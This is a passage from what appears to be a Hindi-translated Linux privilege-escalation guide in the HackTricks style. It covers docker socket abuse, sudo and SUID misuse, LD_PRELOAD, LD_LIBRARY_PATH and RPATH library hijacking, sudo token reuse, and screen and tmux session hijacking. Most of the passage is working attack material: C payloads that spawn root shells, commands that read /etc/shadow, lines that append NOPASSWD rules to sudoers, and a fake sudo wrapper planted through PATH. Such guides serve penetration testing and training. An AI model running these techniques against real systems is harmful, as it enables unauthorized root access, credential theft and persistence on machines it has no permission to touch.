3.  **Attach to the Container:** `socat` का उपयोग करके container के साथ एक connection स्थापित करें, जिससे उसमें command execution संभव हो सके।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` connection सेटअप करने के बाद, आप container में सीधे host की filesystem पर root-स्तरीय access के साथ commands execute कर सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप पाते हैं कि आप **`ctr`** कमांड का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप पाते हैं कि आप **`runc`** कमांड का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत **inter-Process Communication (IPC) system** है जो applications को प्रभावी ढंग से interact और डेटा साझा करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया, यह विभिन्न प्रकार के application communication के लिए एक मजबूत फ्रेमवर्क प्रदान करता है।

यह सिस्टम बहुमुखी है, यह basic IPC का समर्थन करता है जो प्रक्रियाओं के बीच डेटा विनिमय को बेहतर बनाता है, और यह **enhanced UNIX domain sockets** की याद दिलाता है। इसके अलावा, यह events या signals का broadcast करने में मदद करता है, जिससे सिस्टम घटकों के बीच सहज एकीकरण को बढ़ावा मिलता है। उदाहरण के लिए, incoming call के बारे में एक Bluetooth daemon का संकेत एक music player को mute करने के लिए प्रेरित कर सकता है, जिससे उपयोगकर्ता अनुभव बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object system का समर्थन करता है, जो applications के बीच service requests और method invocations को सरल बनाता है और परंपरागत रूप से जटिल प्रक्रियाओं को सुगम करता है।

D-Bus **allow/deny model** पर काम करता है, जो matching policy rules के cumulative effect के आधार पर message permissions (method calls, signal emissions, आदि) को manage करता है। ये policies bus के साथ interactions निर्दिष्ट करती हैं, और इन permissions के शोषण के माध्यम से potential रूप से privilege escalation की अनुमति दे सकती हैं।

`/etc/dbus-1/system.d/wpa_supplicant.conf` में ऐसी एक policy का उदाहरण दिया गया है, जो root user को `fi.w1.wpa_supplicant1` का मालिक होने, संदेश भेजने और प्राप्त करने की permissions का विवरण देता है।

जिस नीति में कोई विशेष user या group निर्दिष्ट नहीं है वह सार्वभौमिक रूप से लागू होती है, जबकि "default" context policies उन सभी पर लागू होती हैं जो अन्य विशिष्ट नीतियों द्वारा कवर नहीं किए गए हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ जानें कि enumerate and exploit a D-Bus communication कैसे करें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

यह हमेशा रोचक होता है enumerate the network और मशीन की स्थिति का पता लगाने के लिए।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

हमेशा उस मशीन पर चल रहे नेटवर्क सेवाओं की जाँच करें जिनके साथ आप पहुँचने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँच करें कि क्या आप sniff traffic कर सकते हैं। अगर आप कर सकते हैं, तो आप कुछ credentials पकड़ने में सक्षम हो सकते हैं।
```
timeout 1 tcpdump
```
## उपयोगकर्ता

### Generic Enumeration

जांचें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** मौजूद हैं, कौन **login** कर सकता है और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बड़ा UID

कुछ Linux वर्शन एक बग से प्रभावित थे जो **UID > INT_MAX** वाले उपयोगकर्ताओं को escalate privileges की अनुमति देता है. अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप **किसी समूह के सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँचें कि क्लिपबोर्ड के अंदर कुछ रोचक तो नहीं है (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप किसी वातावरण का कोई भी **पासवर्ड जानते हैं**, तो उस पासवर्ड का उपयोग करके **प्रत्येक उपयोगकर्ता के रूप में login करने का प्रयास करें**।

### Su Brute

यदि आपको बहुत शोर मचाने की परवाह नहीं है और कंप्यूटर पर `su` और `timeout` बाइनरीज़ मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके user पर brute-force आज़माने की कोशिश कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ भी users पर brute-force करने की कोशिश करता है।

## Writable PATH के दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप $PATH के किसी फ़ोल्डर के अंदर **लिख सकते हैं** तो आप privileges escalate कर सकते हैं — writable फ़ोल्डर के अंदर किसी ऐसे कमांड के नाम से **backdoor** बनाकर जो किसी दूसरे उपयोगकर्ता (आदर्श रूप से root) द्वारा execute किया जाएगा और जो $PATH में आपके writable फ़ोल्डर से पहले स्थित किसी फ़ोल्डर से load नहीं होता।

### SUDO and SUID

आपको sudo का उपयोग करके कुछ कमांड execute करने की अनुमति दी गई हो सकती है या उन पर suid bit सेट हो सकता है। इसे जांचें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित कमांड आपको फ़ाइलें पढ़ने और/या लिखने या यहाँ तक कि कोई कमांड निष्पादित करने की अनुमति देती हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration एक उपयोगकर्ता को बिना पासवर्ड जाने किसी अन्य उपयोगकर्ता के अधिकारों के साथ कोई कमांड चलाने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `vim` को `root` के रूप में चला सकता है; अब `root` डायरेक्टरी में एक ssh key जोड़कर या `sh` को कॉल करके shell प्राप्त करना आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को किसी प्रक्रिया को चलाते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **based on HTB machine Admirer**, **vulnerable** था — **PYTHONPATH hijacking** द्वारा स्क्रिप्ट को root के रूप में चलाते समय कोई भी python library लोड की जा सकती थी:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (उदा., `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के non-interactive startup व्यवहार का लाभ उठाकर किसी अनुमत कमांड को चलाते समय arbitrary code को root के रूप में चला सकते हैं।

- क्यों यह काम करता है: गैर-इंटरएक्टिव शेल के लिए, Bash `$BASH_ENV` का मूल्यांकन करता है और target script चलाने से पहले उस फाइल को source करता है। कई sudo नियम एक script या shell wrapper को चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा संरक्षित है, तो आपकी फाइल root privileges के साथ source की जाएगी।

- आवश्यकताएँ:
- ऐसा sudo rule जिसे आप चला सकें (कोई भी target जो non-interactively `/bin/bash` को invoke करता है, या कोई भी bash script)।
- `BASH_ENV` `env_keep` में मौजूद हो (जाँच के लिए `sudo -l` चलाएँ)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- `BASH_ENV` (और `ENV`) को `env_keep` से हटाएँ, `env_reset` को प्राथमिकता दें।
- sudo-allowed कमांड्स के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- preserved env vars के उपयोग होने पर sudo I/O logging और alerting पर विचार करें।

### Sudo execution को बायपास करने वाले paths

**Jump** अन्य फाइलें पढ़ने के लिए या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**रोकथाम**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary कमांड पथ के बिना

यदि **sudo permission** किसी एक कमांड को **पथ निर्दिष्ट किए बिना** दिया गया है: _hacker10 ALL= (root) less_ तो आप PATH variable बदलकर इसे exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी इस्तेमाल की जा सकती है यदि एक **suid** binary किसी अन्य command को path बताए बिना execute करता है (हमेशा किसी अजीब SUID binary की सामग्री को _**strings**_ से जाँचें)।

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary जिसमें command path दिया गया हो

यदि **suid** binary किसी command को path के साथ execute करता है, तो आप उस command के नाम का एक function बनाकर उसे **export a function** करने की कोशिश कर सकते हैं जिसे suid फ़ाइल कॉल कर रही है।

उदाहरण के लिए, यदि एक suid binary _**/usr/sbin/service apache2 start**_ कॉल करता है, तो आपको उस function को बनाकर export करने की कोशिश करनी होगी:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
तो, जब आप suid बाइनरी को कॉल करेंगे, यह फ़ंक्शन निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

हालाँकि, सिस्टम सुरक्षा बनाए रखने और इस सुविधा का दुरुपयोग होने से रोकने के लिए, विशेषकर **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- लोडर उन executables के लिए **LD_PRELOAD** को अनदेखा कर देता है जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- **suid/sgid** वाले executables के लिए, केवल मानक पथों में स्थित और जो स्वयं suid/sgid हों ऐसी लाइब्रेरियाँ ही प्री-लोड की जाती हैं।

Privilege escalation हो सकती है यदि आपके पास `sudo` के साथ कमांड चलाने की क्षमता है और `sudo -l` के आउटपुट में **env_keep+=LD_PRELOAD** शामिल है। यह कॉन्फ़िगरेशन **LD_PRELOAD** environment variable को बनाए रखने और `sudo` के साथ कमांड चलाने पर भी मान्यता प्राप्त करने की अनुमति देता है, जिससे संभावित रूप से मनमाना कोड उच्च अधिकारों के साथ निष्पादित हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
के रूप में सहेजें **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **इसे कम्पाइल करें**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाकर
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> यदि attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है तो उसी तरह का privesc दुरुपयोग किया जा सकता है क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी ऐसे binary को देखा जाए जिसकी **SUID** permissions असामान्य लगती हैं, तो यह अच्छी प्रैक्टिस है यह सत्यापित करना कि यह **.so** files ठीक से लोड कर रहा है या नहीं। इसे निम्नलिखित command चलाकर चेक किया जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि का सामना करना संभावित exploitation का संकेत देता है।

इसे exploit करने के लिए, आप एक C फ़ाइल बनाएँगे, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह code, एक बार compiled और executed होने पर, file permissions को manipulate करके और elevated privileges के साथ एक shell execute करके privileges बढ़ाने का प्रयास करता है।

ऊपर दिए गए C file को एक shared object (.so) file में compile करने के लिए:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित system compromise संभव होगा।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो एक folder से library लोड कर रहा है जिसमें हम लिख सकते हैं, तो आइए उस folder में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको इस तरह की त्रुटि मिलती है:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक curated सूची है जिन्हें attacker स्थानीय security restrictions को bypass करने के लिए exploit कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है लेकिन उन मामलों के लिए जहाँ आप केवल arguments inject कर सकते हैं।

प्रोजेक्ट Unix binaries के वैध functions को इकट्ठा करता है जिन्हें restricted shells से बाहर निकलने, privileges escalate या maintain करने, फ़ाइलें transfer करने, bind और reverse shells spawn करने, और अन्य post-exploitation tasks को आसान बनाने के लिए abuse किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` एक्सेस कर सकते हैं तो आप टूल [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग यह देखने के लिए कर सकते हैं कि वह किसी भी sudo rule को exploit करने का तरीका ढूँढता है या नहीं।

### Reusing Sudo Tokens

ऐसे मामलों में जहाँ आपके पास **sudo access** है पर password नहीं है, आप privileges escalate कर सकते हैं **एक sudo command execution का इंतजार करके और फिर session token को hijack करके**।

Privileges escalate करने की आवश्यकताएँ:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell होना चाहिए
- "_sampleuser_" ने **पिछले 15mins** में कुछ execute करने के लिए **`sudo`** का उपयोग किया हो (डिफ़ॉल्ट रूप से यही sudo token की अवधि है जो बिना password के `sudo` उपयोग करने की अनुमति देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` का मान 0 होना चाहिए
- `gdb` उपलब्ध होना चाहिए (आप इसे upload कर पाने में सक्षम होने चाहिए)

(आप अस्थायी रूप से `ptrace_scope` को `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` से सक्षम कर सकते हैं या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को संशोधित करके और `kernel.yama.ptrace_scope = 0` सेट करके)

यदि ये सभी आवश्यकताएँ पूरी हों, **आप privileges escalate कर सकते हैं:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- पहला **exploit** (`exploit.sh`) _/tmp_ में `activate_sudo_token` बाइनरी बनाएगा। आप इसका उपयोग अपनी session में **sudo token activate करने** के लिए कर सकते हैं (आपको अपने आप root shell नहीं मिलेगा, `sudo su` करें):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root के मालिकाना हक में और setuid के साथ** होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) **एक sudoers file बनाएगा** जो **sudo tokens को स्थायी बना देगा और सभी उपयोगकर्ताओं को sudo का उपयोग करने की अनुमति देगा**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **किसी user और PID के लिए sudo token बना सकते हैं**।\
उदाहरण के लिए, यदि आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 के साथ एक shell है, तो आप पासवर्ड जाने बिना **sudo privileges प्राप्त** कर सकते हैं जैसा कि नीचे किया गया है:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. ये फाइलें **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा ही पढ़ी जा सकती हैं**.\
**यदि** आप इस फाइल को **पढ़** सकते हैं तो आप कुछ दिलचस्प जानकारी **प्राप्त** कर सकते हैं, और यदि आप किसी भी फाइल को **लिख** सकते हैं तो आप **escalate privileges** कर सकेंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD के लिए `doas` जैसे `sudo` बाइनरी के कुछ विकल्प होते हैं — इसकी कॉन्फ़िगरेशन `/etc/doas.conf` में चेक करना याद रखें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **user usually connects to a machine and uses `sudo`** privileges बढ़ाने के लिए और आपने उस user context में एक shell प्राप्त कर लिया है, तो आप **create a new sudo executable** बना सकते हैं जो पहले आपके कोड को root के रूप में चलाएगा और फिर user की कमांड execute करेगा। इसके बाद user context का $PATH संशोधित करें (उदाहरण के लिए नए path को .bash_profile में जोड़कर) ताकि जब user sudo चलाए तो आपका sudo executable executed हो।

ध्यान दें कि यदि user किसी अलग shell (bash नहीं) का उपयोग करता है तो नया path जोड़ने के लिए आपको अन्य फाइलें बदलनी पड़ेंगी। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

या कुछ इस तरह चलाकर:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

The file `/etc/ld.so.conf` indicates **कि लोड किए गए कॉन्फ़िगरेशन फाइलें कहाँ से आती हैं**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **अन्य फ़ोल्डरों की ओर इशारा करती हैं** जहाँ **लाइब्रेरीज़** की **खोज** की जाएगी। For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर लाइब्रेरीज़ की खोज करेगा**।

यदि किसी कारणवश **किसी उपयोगकर्ता के पास लिखने की अनुमति** ऊपर बताए गए किसी भी पथ पर हो: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल या `/etc/ld.so.conf.d/*.conf` के अंदर कॉन्फ़िग फाइल द्वारा संकेतित कोई भी फ़ोल्डर, तो वह संभवतः escalate privileges कर सकता है.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर यह प्रोग्राम द्वारा उसी स्थान पर उपयोग किया जाएगा जैसा कि `RPATH` वेरिएबल में निर्दिष्ट है।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
उसके बाद `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` के साथ एक दुष्ट लाइब्रेरी बनाएँ।
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities एक प्रक्रिया को उपलब्ध **root अधिकारों का एक उपसमुच्चय** प्रदान करती हैं। यह प्रभावी रूप से root **अधिकारों को छोटे और विशिष्ट इकाइयों में विभाजित** कर देता है। इन इकाइयों में से प्रत्येक को स्वतंत्र रूप से प्रक्रियाओं को सौंपा जा सकता है। इस तरह पूर्ण अधिकारों का सेट कम हो जाता है, जिससे शोषण के जोखिम घटते हैं।\
निम्न पृष्ठ पढ़ें ताकि **capabilities और उन्हें कैसे दुरुपयोग किया जा सकता है** के बारे में अधिक जान सकें:


{{#ref}}
linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

एक डायरेक्टरी में, **bit for "execute"** का मतलब है कि प्रभावित user फ़ोल्डर में "**cd**" कर सकता है।\
**"read"** bit का मतलब है कि user **list** कर सकता है **files**, और **"write"** bit का मतलब है कि user **delete** और नए **files** **create** कर सकता है।

## ACLs

Access Control Lists (ACLs) अनुमतियों की एक द्वितीयक परत का प्रतिनिधित्व करते हैं, जो पारंपरिक ugo/rwx permissions को **ओवरराइड** करने में सक्षम हैं। ये permissions file या directory access पर नियंत्रण बढ़ाते हैं, क्योंकि ये उन specific users को rights देने या न देने की अनुमति देती हैं जो owner नहीं हैं या group का हिस्सा नहीं हैं। यह स्तर की **सूक्ष्मता अधिक सटीक access management सुनिश्चित करती है**। आगे के विवरण [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) मिल सकते हैं।

**Give** user "kali" को किसी file पर read और write permissions दें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुले shell sessions

**पुराने संस्करणों** में आप किसी दूसरे user (**root**) के कुछ **shell** session को **hijack** कर सकते हैं।\
**नवीनतम संस्करणों** में आप केवल अपने ही **अपने user** के screen sessions से **connect** कर पाएँगे। हालाँकि, आप session के अंदर **रोचक जानकारी** पा सकते हैं।

### screen sessions hijacking

**screen sessions की सूची**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**session से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **old tmux versions** के साथ एक समस्या थी। मैं non-privileged user के रूप में root द्वारा बनाई गई tmux (v2.1) session को hijack करने में सक्षम नहीं था।

**tmux sessions सूची करें**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**एक session से Attach करें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** के लिए एक उदाहरण देखें।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
